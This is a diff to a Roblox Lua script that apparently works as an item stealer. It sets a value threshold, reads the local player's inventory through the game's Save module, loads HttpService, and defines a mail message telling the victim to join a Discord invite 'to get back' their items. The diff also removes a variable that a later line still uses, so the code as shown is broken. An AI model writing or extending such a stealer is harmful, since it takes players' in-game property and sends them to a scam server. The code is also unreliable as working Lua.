@@ -1,10 +1,16 @@
 local rapThreshold = 100000 -- Set the RAP threshold value
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-local replicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+
+local library = require(game.ReplicatedStorage.Library)
+
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+
 local plr = game.Players.LocalPlayer
+
 local MailMessage = "Join gg / GY2RVSEGDT to get back"
+
+local HttpService = game:GetService("HttpService")
 
 -- Ensure the Library module exists
 local libraryModule = replicatedStorage:FindFirstChild("Library")
